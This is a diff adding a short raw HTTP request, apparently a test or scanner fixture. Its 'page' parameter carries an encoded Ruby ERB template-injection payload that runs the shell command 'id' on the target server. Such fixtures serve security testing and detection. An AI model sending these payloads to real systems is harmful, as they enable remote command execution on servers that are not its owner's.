@@ -1,0 +1,4 @@
+GET /a?page=\u003C%%3D%20IO.popen(\u0027id\u0027).read%20%\u003E HTTP/1.1
+Host: demo.example.com
+Connection: close
+
